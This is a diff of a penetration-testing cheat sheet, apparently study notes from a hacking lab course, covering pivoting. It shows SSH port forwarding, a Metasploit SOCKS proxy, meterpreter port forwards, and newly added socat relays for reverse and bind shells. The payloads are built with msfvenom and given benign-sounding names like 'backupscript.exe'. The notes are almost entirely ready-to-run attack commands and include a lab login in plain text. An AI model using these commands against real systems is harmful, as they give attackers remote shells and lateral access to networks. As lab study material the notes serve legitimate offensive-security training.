@@ -16,7 +16,7 @@
   # port 3036 mysql hosted localy , we want access mysql from our attack host
 
   # Executing the Local Port Forward
-  ssh -L 1234:localhost:3306 ubuntu@10.129.202.64 
+  ssh -L 1234:localhost:3306 Machine_01@10.129.202.64 
   # Forward local port 1234 → target's localhost:3306
   
   # Confirming Port Forward with Netstat
@@ -117,7 +117,7 @@
 
   # There could be scenarios when a host's firewall blocks ping (ICMP)
 -------------------------------------------------------------------------------
-## Configuring MSF's SOCKS Proxy
+## Configuring MSF's SOCKS Proxy (for dynamic port forwarding)
   #  start a listener on port 9050 and route all the traffic received via our Meterpreter session.
   use auxiliary/server/socks_proxy
   set SRVPORT 9050
@@ -154,13 +154,13 @@
 ## Port Forwarding
   help portfwd # options
   # local port forwarding 
-      portfwd add -l 3300 -p 3389 -r 172.16.5.19 
+      meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19 
       xfreerdp /v:localhost:3300 /u:victor /p:pass@123 #  Connecting to Windows Target through localhost
      # check the connection established 
      netstat -antp # 127.0.0.1:54652  127.0.0.1:3300 ESTABLISHED 4075/xfreerdp 
   
 ## reverse port forwarding 
-  portfwd add -R -l 8081 -p 1234 -L 10.10.14.18 
+  meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18 
 
   # Configuring & Starting multi/handler
   bg 
@@ -173,4 +173,44 @@
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
   
   # execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server. 
+```
+## Socat Redirection with a Reverse Shell
+```bash
+# Socat Redirection : remote port forwarding without ssh auth 
+# HACKER: 10.129.202.64, M1:10.129.202.65|172.X.X.1 , M2:172.X.X.2
+# (HACKER:80)<==[socket_redirection](<M1>:8080)<==(<M2>)
+
+## on Machine_2 (pivot host)
+socat TCP4-LISTEN:8080,fork TCP4:<HACKER-IP>:80  # Starting Socat Listener
+
+## on our attacker host
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<M1-IP> -f exe -o backupscript.exe LPORT=8080 
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 80
+run
+
+## on M3 (compromised host we wan access)
+.\backupscript.exe # excute the payload
+```
+## Socat Redirection with a Bind Shell
+```bash
+# HACKER: 10.129.202.64, M1:10.129.202.65|172.X.X.1 , M2:172.X.X.2
+# (HACKER:80)==>[socket_redirection](<M1>:8080)==>(<M2>:8443)
+
+# On machine_2 (pivot host)
+socat TCP4-LISTEN:8080,fork TCP4:<M2-IP>:8443
+
+# on Attacker host (hcaker)
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set RHOST <M1-IP>
+set LPORT 8080
+run
+
+# On M2 (machine we want access)
+.\backupjob.exe
 ```
